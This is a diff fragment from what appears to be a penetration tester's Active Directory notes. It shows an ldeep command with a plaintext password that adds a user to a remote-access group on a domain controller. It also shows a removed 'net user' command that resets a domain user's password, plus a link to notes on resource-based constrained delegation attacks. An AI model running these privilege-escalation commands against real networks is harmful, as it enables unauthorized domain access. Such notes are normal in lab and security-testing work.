@@ -706,9 +706,6 @@ git diff <commit hash>
 ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168.181.30 add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
 ```
 
-```jsx
-net user jen Password123 /domain
-```
 
 **Generic All on Computer**: [**Resource Based Constrained Delegation Attack**](https://www.notion.so/Resource-Based-Constrained-Delegation-Attack-8003ef218a7e4cb2b7d0709521e85355?pvs=21) 
 
